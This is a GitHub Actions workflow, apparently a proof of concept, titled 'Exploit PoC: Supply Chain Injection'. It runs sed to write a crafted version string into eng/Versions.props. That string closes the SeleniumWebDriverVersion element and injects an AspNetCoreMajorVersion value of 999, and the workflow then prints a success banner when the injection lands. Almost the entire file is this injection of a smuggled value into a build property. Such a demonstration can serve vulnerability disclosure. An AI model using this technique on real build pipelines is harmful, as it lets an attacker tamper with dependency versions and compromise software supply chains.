name: "Exploit PoC: Supply Chain Injection"

on:
  workflow_dispatch:

jobs:
  supply-chain-poisoning:
    runs-on: ubuntu-latest
    steps:
      - name: "Clone Repository"
        uses: actions/checkout@v4

      - name: "Execute Vulnerable Logic"
        run: |
          TARGET_FILE="eng/Versions.props"
          # Hum direct payload ko variable mein daal rahe hain (No GITHUB_OUTPUT needed)
          VALUE="1.2.3</SeleniumWebDriverVersion><AspNetCoreMajorVersion>999</AspNetCoreMajorVersion>"
          
          echo "[*] Processing automated update..."
          sed -i "s@<SeleniumWebDriverVersion>.*</SeleniumWebDriverVersion>@<SeleniumWebDriverVersion>$VALUE</SeleniumWebDriverVersion>@" "$TARGET_FILE"

      - name: "Verify Infrastructure Compromise"
        run: |
          echo "=== SECURITY AUDIT REPORT ==="
          grep "AspNetCoreMajorVersion" eng/Versions.props
          
          if grep -q "999" eng/Versions.props; then
             echo "🚨 EXPLOIT SUCCESSFUL: SECURITY BOUNDARY BYPASSED!"
          else
             echo "[-] Exploit failed."
             exit 1
          fi
